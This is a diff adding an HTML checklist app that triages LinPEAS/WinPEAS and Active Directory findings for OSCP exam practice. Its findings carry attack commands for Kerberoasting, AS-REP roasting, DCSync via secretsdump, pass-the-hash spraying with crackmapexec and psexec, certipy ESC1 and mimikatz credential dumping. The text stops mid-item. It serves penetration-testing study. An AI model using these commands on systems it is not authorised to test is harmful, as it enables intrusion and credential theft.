@@ -1,0 +1,1043 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>PEAS Triage</title>
+<style>
+  /* Layout: fixed command-center header with progress, then priority-banded finding cards in a single scroll column */
+  :root {
+    --bg: #f4f6f8;
+    --surface: #ffffff;
+    --surface-2: #eef1f4;
+    --fg: #16202a;
+    --muted: #5a6b7a;
+    --faint: #8595a3;
+    --border: #d8dee4;
+    --accent: #1f6feb;
+    --accent-soft: #e6f0ff;
+    --term-bg: #0d1b24;
+    --term-fg: #d6e6ef;
+    --term-prompt: #4fd6a0;
+    --crit: #d1242f;
+    --crit-soft: #fbe9ea;
+    --high: #d4700a;
+    --high-soft: #fbf0e2;
+    --med: #9a6b00;
+    --med-soft: #f8f2dd;
+    --low: #2e7d55;
+    --low-soft: #e5f3ec;
+    --waste: #6b4ea8;
+    --waste-soft: #efe9f8;
+    --shadow: 0 1px 3px rgba(20,32,42,.08), 0 6px 20px rgba(20,32,42,.05);
+    --mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+    --sans: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0b1016;
+      --surface: #141b23;
+      --surface-2: #1c252f;
+      --fg: #e4ecf2;
+      --muted: #9fb0bd;
+      --faint: #6e8192;
+      --border: #28333e;
+      --accent: #58a6ff;
+      --accent-soft: #15293f;
+      --term-bg: #07121a;
+      --term-fg: #c6dae6;
+      --term-prompt: #4fd6a0;
+      --crit: #ff6b74;
+      --crit-soft: #2a1618;
+      --high: #f0a04b;
+      --high-soft: #2a1f12;
+      --med: #e0c24a;
+      --med-soft: #262013;
+      --low: #5bc48b;
+      --low-soft: #122319;
+      --waste: #b79aee;
+      --waste-soft: #1e1830;
+      --shadow: 0 1px 3px rgba(0,0,0,.4), 0 8px 24px rgba(0,0,0,.3);
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0b1016;
+    --surface: #141b23;
+    --surface-2: #1c252f;
+    --fg: #e4ecf2;
+    --muted: #9fb0bd;
+    --faint: #6e8192;
+    --border: #28333e;
+    --accent: #58a6ff;
+    --accent-soft: #15293f;
+    --term-bg: #07121a;
+    --term-fg: #c6dae6;
+    --term-prompt: #4fd6a0;
+    --crit: #ff6b74;
+    --crit-soft: #2a1618;
+    --high: #f0a04b;
+    --high-soft: #2a1f12;
+    --med: #e0c24a;
+    --med-soft: #262013;
+    --low: #5bc48b;
+    --low-soft: #122319;
+    --waste: #b79aee;
+    --waste-soft: #1e1830;
+    --shadow: 0 1px 3px rgba(0,0,0,.4), 0 8px 24px rgba(0,0,0,.3);
+    color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    line-height: 1.5;
+    margin: 0;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrap {
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 0 16px 64px;
+  }
+
+  /* ---- Header / command center ---- */
+  header {
+    position: sticky;
+    top: env(safe-area-inset-top, 0px);
+    z-index: 20;
+    background: color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    margin: 0 -16px;
+    padding: 14px 16px 12px;
+  }
+  .masthead {
+    max-width: 888px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .brand { display: flex; align-items: baseline; gap: 9px; min-width: 0; }
+  .brand h1 {
+    font-size: 1.12rem;
+    font-weight: 700;
+    letter-spacing: -.02em;
+    margin: 0;
+    white-space: nowrap;
+  }
+  .brand .dollar { color: var(--term-prompt); font-family: var(--mono); font-weight: 700; }
+  .brand .sub {
+    font-size: .72rem;
+    color: var(--faint);
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    font-weight: 600;
+    white-space: nowrap;
+  }
+  .ctrl { margin-left: auto; display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+  .os-toggle { display: inline-flex; background: var(--surface-2); border: 1px solid var(--border); border-radius: 8px; padding: 2px; }
+  .os-toggle button {
+    font-family: var(--sans);
+    font-size: .78rem;
+    font-weight: 600;
+    border: 0; background: transparent; color: var(--muted);
+    padding: 5px 13px; border-radius: 6px; cursor: pointer;
+  }
+  .os-toggle button[aria-pressed="true"] { background: var(--accent); color: #fff; }
+  .iconbtn {
+    font-family: var(--sans); font-size: .76rem; font-weight: 600;
+    border: 1px solid var(--border); background: var(--surface);
+    color: var(--muted); padding: 6px 10px; border-radius: 8px; cursor: pointer;
+  }
+  .iconbtn:hover { color: var(--fg); border-color: var(--accent); }
+  .iconbtn[aria-pressed="true"] { background: var(--accent-soft); color: var(--accent); border-color: var(--accent); }
+
+  /* compact / quick-scan view: collapse cards to a dense checklist line */
+  body.compact .band-desc,
+  body.compact .card-why,
+  body.compact .expand { display: none; }
+  body.compact .card-top { padding: 8px 14px; align-items: center; }
+  body.compact .card { margin-bottom: 6px; }
+  body.compact .card-body { display: none !important; }
+  body.compact .card-title { font-size: .85rem; font-weight: 600; margin: 0; }
+  body.compact .band { margin-bottom: 22px; }
+
+  .progress-row {
+    max-width: 888px;
+    margin: 11px auto 0;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .bar-track {
+    flex: 1; min-width: 0;
+    height: 8px; border-radius: 999px;
+    background: var(--surface-2);
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .bar-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, var(--low), var(--accent));
+    border-radius: 999px;
+    transition: width .35s ease;
+  }
+  .pct {
+    font-family: var(--mono);
+    font-size: .82rem; font-weight: 600;
+    font-variant-numeric: tabular-nums;
+    color: var(--muted);
+    white-space: nowrap;
+  }
+
+  /* ---- Priority filter chips ---- */
+  .filters {
+    display: flex; gap: 7px; flex-wrap: wrap;
+    margin: 20px 0 18px;
+  }
+  .chip {
+    font-size: .76rem; font-weight: 600;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    color: var(--muted);
+    padding: 5px 12px; border-radius: 999px; cursor: pointer;
+    display: inline-flex; align-items: center; gap: 6px;
+  }
+  .chip .dot { width: 8px; height: 8px; border-radius: 50%; }
+  .chip[aria-pressed="true"] { color: var(--fg); border-color: currentColor; }
+  .chip .n { font-family: var(--mono); font-size: .7rem; color: var(--faint); font-variant-numeric: tabular-nums; }
+
+  /* ---- Band ---- */
+  .band { margin-bottom: 34px; scroll-margin-top: 120px; }
+  .band-head {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 4px;
+  }
+  .band-stripe { width: 4px; height: 20px; border-radius: 2px; }
+  .band-head h2 {
+    font-size: .98rem; font-weight: 700; margin: 0;
+    letter-spacing: -.01em;
+  }
+  .band-head .tag {
+    font-family: var(--mono); font-size: .68rem; font-weight: 600;
+    text-transform: uppercase; letter-spacing: .06em;
+    padding: 2px 7px; border-radius: 5px;
+  }
+  .band-desc { font-size: .83rem; color: var(--muted); margin: 0 0 14px 14px; max-width: 62ch; }
+
+  /* ---- Finding card ---- */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--band-color, var(--border));
+    border-radius: 11px;
+    box-shadow: var(--shadow);
+    margin-bottom: 12px;
+    overflow: hidden;
+  }
+  .card.done { opacity: .62; }
+  .card-top {
+    display: flex; gap: 12px; align-items: flex-start;
+    padding: 14px 16px;
+    cursor: pointer;
+  }
+  .card-top:hover { background: var(--surface-2); }
+  .cbox {
+    appearance: none; -webkit-appearance: none;
+    flex: none; width: 20px; height: 20px; margin-top: 1px;
+    border: 2px solid var(--border); border-radius: 6px;
+    background: var(--surface); cursor: pointer; position: relative;
+  }
+  .cbox:checked { background: var(--band-color, var(--accent)); border-color: var(--band-color, var(--accent)); }
+  .cbox:checked::after {
+    content: ""; position: absolute; left: 5px; top: 1px;
+    width: 5px; height: 10px; border: solid #fff; border-width: 0 2px 2px 0;
+    transform: rotate(45deg);
+  }
+  .cbox:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .card-main { min-width: 0; flex: 1; }
+  .card-title { font-size: .92rem; font-weight: 650; margin: 0 0 2px; letter-spacing: -.01em; }
+  .card.done .card-title { text-decoration: line-through; text-decoration-color: var(--faint); }
+  .card-why { font-size: .82rem; color: var(--muted); margin: 0; }
+  .expand {
+    flex: none; color: var(--faint); font-size: .8rem; margin-top: 2px;
+    transition: transform .2s ease; user-select: none;
+  }
+  .card.open .expand { transform: rotate(90deg); }
+
+  .card-body { display: none; padding: 0 16px 16px 48px; }
+  .card.open .card-body { display: block; }
+
+  .field { margin-top: 13px; }
+  .field-label {
+    font-size: .68rem; font-weight: 700; text-transform: uppercase;
+    letter-spacing: .07em; color: var(--faint); margin-bottom: 6px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .kw { display: flex; flex-wrap: wrap; gap: 6px; }
+  .kw code {
+    font-family: var(--mono); font-size: .76rem;
+    background: var(--surface-2); color: var(--fg);
+    padding: 2px 7px; border-radius: 5px; border: 1px solid var(--border);
+    word-break: break-all;
+  }
+
+  .term {
+    position: relative;
+    background: var(--term-bg); color: var(--term-fg);
+    border-radius: 8px; padding: 11px 13px;
+    font-family: var(--mono); font-size: .78rem; line-height: 1.7;
+    overflow-x: auto;
+  }
+  .term .line { white-space: pre; display: block; }
+  .term .line::before { content: "$ "; color: var(--term-prompt); }
+  .term .line.c::before { content: "# "; color: var(--term-prompt); }
+  .term .cmt { color: var(--faint); }
+  .term .cmt::before { content: ""; }
+  .copy {
+    position: absolute; top: 7px; right: 7px;
+    font-family: var(--sans); font-size: .68rem; font-weight: 600;
+    background: rgba(255,255,255,.08); color: var(--term-fg);
+    border: 1px solid rgba(255,255,255,.15); border-radius: 6px;
+    padding: 3px 9px; cursor: pointer;
+  }
+  .copy:hover { background: rgba(255,255,255,.16); }
+  .copy.ok { color: var(--term-prompt); border-color: var(--term-prompt); }
+
+  .note {
+    font-size: .82rem; color: var(--muted);
+    background: var(--band-soft, var(--surface-2));
+    border-radius: 7px; padding: 9px 12px; margin-top: 4px;
+  }
+  .note strong { color: var(--fg); }
+
+  footer {
+    margin-top: 40px; padding-top: 18px; border-top: 1px solid var(--border);
+    font-size: .78rem; color: var(--faint); text-align: center;
+  }
+  footer code { font-family: var(--mono); background: var(--surface-2); padding: 1px 5px; border-radius: 4px; }
+  .reset { background: none; border: 0; color: var(--crit); font-weight: 600; cursor: pointer; font-size: .78rem; }
+
+  @media (max-width: 480px) {
+    .card-body { padding-left: 16px; }
+    .brand .sub { display: none; }
+  }
+</style>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;650;700&family=JetBrains+Mono:wght@400;600;700&display=swap">
+
+<div class="wrap">
+  <header>
+    <div class="masthead">
+      <div class="brand">
+        <h1><span class="dollar">$</span> PEAS Triage</h1>
+        <span class="sub">OSCP enum playbook</span>
+      </div>
+      <div class="ctrl">
+        <div class="os-toggle" role="group" aria-label="Choose target OS">
+          <button id="osLin" aria-pressed="true">LinPEAS</button>
+          <button id="osWin" aria-pressed="false">WinPEAS</button>
+          <button id="osAd" aria-pressed="false">AD / Domain</button>
+        </div>
+        <button class="iconbtn" id="compactBtn" aria-pressed="false" aria-label="Toggle compact view">▦ Compact</button>
+        <button class="iconbtn" id="themeBtn" aria-label="Toggle theme">◐ Theme</button>
+      </div>
+    </div>
+    <div class="progress-row">
+      <div class="bar-track"><div class="bar-fill" id="barFill"></div></div>
+      <span class="pct" id="pct">0 / 0</span>
+    </div>
+  </header>
+
+  <div class="filters" id="filters"></div>
+  <main id="board"></main>
+
+  <footer>
+    <p>Progress is saved in this browser only. PEAS is enumeration output — every finding below still needs <strong>manual validation</strong> before you spend exam time on it. Priorities are heuristics, not a guarantee of exploitability.</p>
+    <p style="margin-top:10px"><button class="reset" id="resetBtn">Reset all checkboxes</button></p>
+  </footer>
+</div>
+
+<script>
+/* ---------------- DATA ---------------- */
+const PRIOS = [
+  { id:"crit", label:"Critical", tag:"act first", color:"var(--crit)", soft:"var(--crit-soft)",
+    desc:"Direct or near-direct paths to root/SYSTEM. If PEAS highlights these, validate and go here before anything else." },
+  { id:"high", label:"High", tag:"strong lead", color:"var(--high)", soft:"var(--high-soft)",
+    desc:"Reliable escalation vectors that usually pay off once confirmed. Work these after criticals come up dry." },
+  { id:"med", label:"Medium", tag:"worth a look", color:"var(--med)", soft:"var(--med-soft)",
+    desc:"Context-dependent leads. Note them, chase only after high-value paths are exhausted." },
+  { id:"low", label:"Low / Info", tag:"background", color:"var(--low)", soft:"var(--low-soft)",
+    desc:"Recon and situational awareness. Rarely a direct win but shapes where you look next." },
+  { id:"waste", label:"Time-wasters", tag:"avoid the rabbit hole", color:"var(--waste)", soft:"var(--waste-soft)",
+    desc:"PEAS flags these loudly but they seldom lead anywhere on the exam. Recognise and move on." },
+];
+
+/* Each item: id, os ("lin"|"win"|"both"), prio, title, why, keywords[], cmds[{t,c?}], note */
+const ITEMS = [
+  /* ---------- LINUX ---------- */
+  { id:"l-sudo", os:"lin", prio:"crit", title:"sudo -l entries (NOPASSWD / GTFOBins)",
+    why:"The single highest-yield Linux check. A command you can run as root via sudo is often an instant win.",
+    kw:["(root) NOPASSWD:","User may run the following commands","env_keep","!authenticate"],
+    cmds:[{t:"sudo -l"},{t:"# cross-check each allowed binary against GTFOBins sudo section",cmt:1}],
+    note:"PEAS prints this in a 95%-confidence yellow/red block. Match every listed binary to GTFOBins — even 'harmless' ones like find, vim, less, awk, tar escalate." },
+  { id:"l-suid", os:"lin", prio:"crit", title:"Unusual SUID / SGID binaries",
+    why:"A SUID binary owned by root that maps to a GTFOBins entry, or a custom/uncommon one, is a top-tier vector.",
+    kw:["SUID","-rwsr-xr-x","GTFOBins","Unknown SUID binary","interesting"],
+    cmds:[{t:"find / -perm -4000 -type f 2>/dev/null"},{t:"find / -perm -4000 -user root 2>/dev/null"}],
+    note:"Ignore the standard set (ping, su, mount, passwd, sudo). Hunt for anything custom, version-specific, or flagged as uncommon by PEAS." },
+  { id:"l-caps", os:"lin", prio:"crit", title:"Dangerous file capabilities",
+    why:"cap_setuid, cap_dac_override and friends on an interpreter (python, perl, node) are a clean root path.",
+    kw:["cap_setuid","cap_dac_read_search","cap_sys_admin","=ep","Capabilities"],
+    cmds:[{t:"getcap -r / 2>/dev/null"}],
+    note:"cap_setuid+ep on /usr/bin/python → one-liner to drop a root shell. Don't overlook this just because SUID looked empty." },
+  { id:"l-writepath", os:"lin", prio:"high", title:"Writable paths in root cron / service / PATH",
+    why:"A root process executing a file or relative binary you can write is a reliable scheduled-escalation path.",
+    kw:["Writable","cron","/etc/cron","* * * * *","PATH","writable folder in PATH"],
+    cmds:[{t:"cat /etc/crontab; ls -la /etc/cron.*"},{t:"grep -R . /etc/cron* 2>/dev/null"}],
+    note:"PEAS marks world-writable scripts and writable PATH dirs. Confirm the job actually runs as root and on what interval before waiting on it." },
+  { id:"l-pw", os:"lin", prio:"high", title:"Credentials in files, history, and config",
+    why:"Reused passwords unlock su/ssh to root or another user. Cheap to check, frequently decisive.",
+    kw:["password","PASSWORD","passwd","credential","DB_PASS","Possible password"],
+    cmds:[{t:"cat ~/.bash_history ~/.*_history 2>/dev/null"},{t:"grep -RiE 'pass(word)?|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null"}],
+    note:"Always try found creds with 'su root' and against every other service. PEAS surfaces these under a 'Searching passwords' section." },
+  { id:"l-kernel", os:"lin", prio:"med", title:"Kernel / distro version vs public exploits",
+    why:"Occasionally the intended path (DirtyPipe, PwnKit, DirtyCow), but kernel exploits are unstable and can crash the box.",
+    kw:["Linux version","kernel","Vulnerable to","CVE-","Sudo version"],
+    cmds:[{t:"uname -a; cat /etc/os-release"},{t:"# note sudo version too — PwnKit/Baron Samedit map to specific ranges",cmt:1}],
+    note:"Treat kernel LPE as a later option, not a first move. PwnKit (pkexec) and a vulnerable sudo version are the safer, more exam-friendly exceptions." },
+  { id:"l-mount", os:"lin", prio:"med", title:"NFS no_root_squash, fstab, and mounts",
+    why:"An exported share with no_root_squash lets you plant a root-owned SUID binary from your attacker box.",
+    kw:["no_root_squash","/etc/exports","nfs","showmount"],
+    cmds:[{t:"cat /etc/exports 2>/dev/null"},{t:"cat /etc/fstab; mount"}],
+    note:"Also read fstab for credentials and for mounted shares that expose files you otherwise couldn't reach." },
+  { id:"l-net", os:"lin", prio:"low", title:"Internal listening ports & running services",
+    why:"Services bound to localhost only (databases, admin panels) are invisible externally and often the real target.",
+    kw:["127.0.0.1","LISTEN","ss -tulnp","only on localhost"],
+    cmds:[{t:"ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null"},{t:"ps aux --forest"}],
+    note:"A root-run service on 127.0.0.1:3306 or :8080 is a prompt to port-forward, not to ignore. Low priority as a direct win, high value as a signpost." },
+  { id:"l-dotfiles", os:"lin", prio:"low", title:"SSH keys, readable sensitive files, env",
+    why:"A readable id_rsa or an authorized_keys you can write opens lateral and sometimes vertical movement.",
+    kw:["id_rsa","authorized_keys",".ssh","PRIVATE KEY"],
+    cmds:[{t:"find / -name 'id_rsa*' 2>/dev/null"},{t:"ls -la /home/*/.ssh 2>/dev/null"}],
+    note:"Private keys found for other users → try them for lateral movement; that user may have the sudo rights you need." },
+  { id:"l-docker", os:"lin", prio:"waste", title:"'Member of docker/lxd group' when it doesn't apply",
+    why:"A real escalation only if the daemon is present and you're actually in the group — PEAS sometimes flags the group name generically.",
+    kw:["docker group","lxd","is a member"],
+    cmds:[{t:"id; which docker lxc 2>/dev/null"}],
+    note:"Confirm both the group membership AND a working daemon before committing. If docker isn't installed, this yellow line is noise." },
+  { id:"l-colors", os:"lin", prio:"waste", title:"Every red/yellow line treated as exploitable",
+    why:"PEAS colour-codes on pattern match, not confirmed exploitability. Chasing all of them burns the clock.",
+    kw:["99% a PE vector","Highlighted","Yellow/Red"],
+    cmds:[{t:"# run with -a once, then triage by section — don't read top-to-bottom",cmt:1}],
+    note:"Red = PEAS is fairly confident; yellow = maybe. Use the legend, but let sudo/SUID/caps/creds lead regardless of colour volume." },
+
+  /* ---------- WINDOWS ---------- */
+  { id:"w-svc", os:"win", prio:"crit", title:"Unquoted service paths & weak service perms",
+    why:"A service you can reconfigure, or an unquoted path with a writable parent dir, gives SYSTEM on restart.",
+    kw:["Unquoted Service Path","SERVICE_CHANGE_CONFIG","WRITE_DAC","can't be controlled","AllAccess"],
+    cmds:[{t:"accesschk.exe /accepteula -uwcqv user *",cmt:0},{t:"sc qc <service>"}],
+    note:"PEAS flags both the unquoted path AND whether you can write the exploitable folder / reconfigure the service. The permission check is what makes it real." },
+  { id:"w-token", os:"win", prio:"crit", title:"SeImpersonate / SeAssignPrimaryToken privilege",
+    why:"On a service account, this enables the Potato family (JuicyPotato, PrintSpoofer, GodPotato) → SYSTEM. Extremely common.",
+    kw:["SeImpersonatePrivilege","SeAssignPrimaryTokenPrivilege","Enabled","Potato"],
+    cmds:[{t:"whoami /priv"}],
+    note:"If you landed as a service account (IIS, MSSQL) and SeImpersonate is Enabled, this is usually THE path. Highest-confidence Windows finding." },
+  { id:"w-alwaysinstall", os:"win", prio:"crit", title:"AlwaysInstallElevated (both registry keys set)",
+    why:"When both HKLM and HKCU keys = 1, any .msi you craft installs as SYSTEM. Trivial and reliable.",
+    kw:["AlwaysInstallElevated","HKLM","HKCU","is set to 1"],
+    cmds:[{t:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},{t:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"}],
+    note:"BOTH keys must be 1. PEAS reports each separately — verify the pair before building the malicious MSI." },
+  { id:"w-creds", os:"win", prio:"high", title:"Stored credentials, autologon, unattend & SAM",
+    why:"cmdkey, Winlogon autologon, unattend.xml and registry secrets regularly hand over admin or lateral creds.",
+    kw:["DefaultPassword","AutoAdminLogon","unattend","cmdkey","Credential Manager","SAM"],
+    cmds:[{t:"cmdkey /list"},{t:"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""}],
+    note:"PEAS dumps Winlogon autologon and searches common cred files. Try recovered creds with runas / evil-winrm and against every service." },
+  { id:"w-regpath", os:"win", prio:"high", title:"Writable service binaries & modifiable PATH dirs",
+    why:"If the binPath of a running service, or a directory it loads from, is writable, you replace it and gain its context.",
+    kw:["File Permissions","writable","Everyone","Authenticated Users","Modify","BUILTIN"],
+    cmds:[{t:"accesschk.exe /accepteula -quvw \"C:\\Path\\To\\service.exe\"",cmt:0},{t:"icacls \"C:\\Path\\To\\service.exe\""}],
+    note:"Confirm the account running the service, then that you can write the file or its folder. Writable PATH dir + DLL hijack is the related trick." },
+  { id:"w-scheduled", os:"win", prio:"med", title:"Scheduled tasks running as SYSTEM/admin",
+    why:"A task executing a script or binary you can modify, on a known schedule, is a clean escalation.",
+    kw:["Scheduled Tasks","Run As User","SYSTEM","Task to run"],
+    cmds:[{t:"schtasks /query /fo LIST /v"}],
+    note:"Cross-reference the task's action path with your write permissions. Confirm the trigger fires within exam time before you rely on it." },
+  { id:"w-patches", os:"win", prio:"med", title:"Missing patches / OS build vs kernel exploits",
+    why:"Occasionally the route (e.g. a missing hotfix mapping to a known LPE), but noisier and less reliable than token/service paths.",
+    kw:["hotfix","KB","OS Build","Windows version","Vulnerable"],
+    cmds:[{t:"systeminfo"},{t:"# feed systeminfo output to a local exploit-suggester; verify, don't blind-fire",cmt:1}],
+    note:"Exhaust whoami /priv and services first. Treat kernel LPE as a fallback — unstable binaries can lock you out of the box." },
+  { id:"w-installed", os:"win", prio:"low", title:"Installed software, versions & non-default dirs",
+    why:"Third-party software in C:\\ with weak perms, or a vulnerable version, is a signpost to the intended vector.",
+    kw:["Installed Software","Program Files","version","C:\\\\"],
+    cmds:[{t:"reg query HKLM\\SOFTWARE /s /f version 2>nul",cmt:0},{t:"wmic product get name,version"}],
+    note:"A custom app folder at C:\\ root that Authenticated Users can modify is worth more than its version string. Low as a direct win, useful context." },
+  { id:"w-net", os:"win", prio:"low", title:"Internal ports, shares & network info",
+    why:"Localhost-only services and reachable internal hosts set up pivoting and reveal the next target.",
+    kw:["127.0.0.1","LISTENING","netstat","shares"],
+    cmds:[{t:"netstat -ano"},{t:"net share; net user"}],
+    note:"Note services bound only to loopback for port-forwarding. Background priority for escalation, foreground for lateral movement." },
+  { id:"w-av", os:"win", prio:"waste", title:"AV/Defender status & generic 'misconfig' noise",
+    why:"PEAS lists Defender state and dozens of informational registry checks that rarely lead to privesc on their own.",
+    kw:["Defender","AV Information","UAC","is enabled"],
+    cmds:[{t:"# useful for payload evasion, not a privesc vector by itself",cmt:1}],
+    note:"UAC settings and AV status matter for delivery, not escalation. Don't mistake a long informational dump for a vector list." },
+  { id:"w-usergroup", os:"win", prio:"waste", title:"Already-admin / high-priv group as a 'finding'",
+    why:"If you're in Administrators or already have SeDebug as admin, there's nothing to escalate — just get an elevated shell.",
+    kw:["Administrators","high mandatory level","SeDebugPrivilege"],
+    cmds:[{t:"whoami /groups"}],
+    note:"Check your own context first. If you're effectively admin, bypass UAC for an elevated shell instead of hunting a privesc chain." },
+
+  /* ---------- AD / DOMAIN (post-foothold) ---------- */
+  { id:"a-asrep", os:"ad", prio:"crit", title:"AS-REP roasting (DONT_REQ_PREAUTH accounts)",
+    why:"Accounts without Kerberos pre-auth hand you a crackable hash with no credentials at all — often your first domain foothold.",
+    kw:["DONT_REQ_PREAUTH","UF_DONT_REQUIRE_PREAUTH","$krb5asrep$"],
+    cmds:[{t:"impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <DC>"},{t:"# crack: hashcat -m 18200 hashes.txt rockyou.txt",cmt:1}],
+    note:"You only need a username list to try this — no password. Crack offline with hashcat -m 18200, then reuse the password everywhere." },
+  { id:"a-kerb", os:"ad", prio:"crit", title:"Kerberoasting (SPN service accounts)",
+    why:"Any domain user can request service tickets for SPN accounts; weak service passwords crack offline to real domain creds.",
+    kw:["ServicePrincipalName","SPN","$krb5tgs$","GetUserSPNs"],
+    cmds:[{t:"impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request"},{t:"# crack: hashcat -m 13100 hashes.txt rockyou.txt",cmt:1}],
+    note:"Prioritise accounts that are also high-privilege (check group membership in BloodHound). A cracked DA-group service account is the whole box." },
+  { id:"a-dcsync", os:"ad", prio:"crit", title:"DCSync rights (replication privileges)",
+    why:"An account with GetChanges/GetChangesAll can pull every hash in the domain, including krbtgt and Domain Admins.",
+    kw:["GetChanges","GetChangesAll","DS-Replication","DCSync"],
+    cmds:[{t:"impacket-secretsdump domain/user:pass@<DC> -just-dc"},{t:"# BloodHound edge: 'DCSync' / 'GetChangesAll' to the domain object",cmt:1}],
+    note:"BloodHound flags this as a dedicated edge to the domain. Dumping krbtgt also sets up a golden ticket for persistence." },
+  { id:"a-creds-reuse", os:"ad", prio:"crit", title:"Credential / hash reuse across hosts (PtH)",
+    why:"A local admin hash or reused password frequently authenticates to other hosts — the core of OSCP AD lateral movement.",
+    kw:["pass-the-hash","NTLM","local admin","password reuse"],
+    cmds:[{t:"crackmapexec smb <subnet> -u user -H <NThash> --local-auth"},{t:"impacket-psexec domain/user@<host> -hashes :<NThash>"},{t:"# evil-winrm -i <host> -u user -H <NThash>",cmt:1}],
+    note:"Spray a found local-admin hash across the subnet with CME before anything fancy. Shared local admin passwords are the classic quick win." },
+
+  { id:"a-bloodhound", os:"ad", prio:"high", title:"BloodHound attack paths & dangerous ACLs",
+    why:"GenericAll, WriteDACL, ForceChangePassword, AddMember and GPO edges map a concrete route to Domain Admin.",
+    kw:["GenericAll","WriteDACL","ForceChangePassword","Owns","AddMember","Shortest Path"],
+    cmds:[{t:"bloodhound-python -d domain -u user -p pass -ns <DC> -c All"},{t:"# then: 'Shortest paths to Domain Admins' in the GUI",cmt:1}],
+    note:"Collect, then actually analyse. The pre-built 'Shortest Paths to Domain Admins' query is where the exam path usually appears." },
+  { id:"a-deleg", os:"ad", prio:"high", title:"Kerberos delegation (unconstrained / constrained / RBCD)",
+    why:"Unconstrained delegation lets you capture TGTs; constrained and RBCD let you impersonate privileged users to a service.",
+    kw:["TRUSTED_FOR_DELEGATION","msDS-AllowedToDelegateTo","AllowedToActOnBehalfOf","RBCD"],
+    cmds:[{t:"# find: Get-NetComputer -Unconstrained / -TrustedToAuth (PowerView)",cmt:1},{t:"impacket-findDelegation domain/user:pass"}],
+    note:"Unconstrained on a host + a coerced DC auth = DC TGT. RBCD needs write over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity." },
+  { id:"a-adcs", os:"ad", prio:"high", title:"AD CS vulnerable templates (ESC1–ESC8)",
+    why:"A misconfigured certificate template lets a low-priv user enrol a cert as any user — a reliable path to DA.",
+    kw:["ESC1","ENROLLEE_SUPPLIES_SUBJECT","Certify","Certipy","Vulnerable"],
+    cmds:[{t:"certipy find -u user@domain -p pass -dc-ip <DC> -vulnerable -stdout"},{t:"# ESC1: certipy req ... -template <t> -upn administrator@domain",cmt:1}],
+    note:"certipy's -vulnerable flag names the exact ESC class. ESC1 (enrollee-supplies-subject) is the most common on exam-style networks." },
+  { id:"a-laps-gpo", os:"ad", prio:"high", title:"Readable LAPS passwords & writable GPOs",
+    why:"Reading ms-Mcs-AdmPwd gives a host's local admin password; a writable GPO pushes SYSTEM-level actions to its linked OUs.",
+    kw:["ms-Mcs-AdmPwd","LAPS","ReadLAPSPassword","WriteGPO","gPCFileSysPath"],
+    cmds:[{t:"# LAPS: crackmapexec ldap <DC> -u user -p pass -M laps",cmt:1},{t:"# writable GPO → SharpGPOAbuse / pyGPOAbuse",cmt:1}],
+    note:"BloodHound marks 'ReadLAPSPassword' and GPO control edges. A writable GPO linked to a DA-containing OU is effectively domain compromise." },
+
+  { id:"a-sysvol", os:"ad", prio:"med", title:"SYSVOL / GPP cpassword & script shares",
+    why:"Legacy Group Policy Preferences store an AES-encrypted password with a public key — instantly decryptable.",
+    kw:["cpassword","Groups.xml","SYSVOL","gpp"],
+    cmds:[{t:"crackmapexec smb <DC> -u user -p pass -M gpp_password"},{t:"# or: findstr /S /I cpassword \\\\<DC>\\SYSVOL\\*.xml",cmt:1}],
+    note:"Rare on patched domains but trivial when present. Also grep SYSVOL logon scripts for hardcoded creds and mapped-drive passwords." },
+  { id:"a-dpapi", os:"ad", prio:"med", title:"Stored secrets: cmdkey, DPAPI, browser & vault",
+    why:"Saved runas creds, DPAPI master keys, and browser vaults on a compromised host often yield another user's domain password.",
+    kw:["cmdkey","DPAPI","Credential","vaultcmd","mimikatz"],
+    cmds:[{t:"cmdkey /list"},{t:"# mimikatz: sekurlsa::logonpasswords / dpapi::cred",cmt:1}],
+    note:"After local SYSTEM, dump LSASS and DPAPI for cached domain creds before pivoting. These feed straight back into the reuse check." },
+  { id:"a-maq", os:"ad", prio:"med", title:"MachineAccountQuota & noPac / sAMAccountName",
+    why:"The default quota of 10 lets any user add a computer account, enabling RBCD and the sAMAccountName spoofing path.",
